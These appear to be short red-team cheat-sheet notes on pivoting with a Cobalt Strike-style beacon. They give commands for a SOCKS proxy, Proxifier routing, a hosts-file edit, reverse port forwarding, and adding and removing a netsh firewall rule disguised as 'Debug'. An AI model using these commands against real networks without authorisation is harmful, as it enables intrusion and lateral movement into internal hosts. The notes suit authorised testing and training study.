# Pivoting

- Start SOCKS proxy

```shell
beacon> socks 1080
```

- Send proxy traffic to windows:

```txt
- To create a new proxy server profile, select Profile > Proxy Servers.  The IP address will be that of your team server, and the port and protocol need to match what you used in the socks command.

- When adding a new proxification rule, you can generally leave the applications field as Any but specify the IP range (and/or domain names) of your target hosts.  This ensures that only traffic destined for the target internal network will go through the proxy.

- Add hosts to file
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1'
```

- Reverse ports forwarding

```shell
rportfwd [bind port] [forward host] [forward port]

# If needed, Add a firewall rule to allow port 28190 inbound.
beacon> run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
beacon> run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
```

- Stop port forwarding

```shell
beacon rportfwd stop $PORT
beacon run netsh advfirewall firewall delete rule name="Debug"
```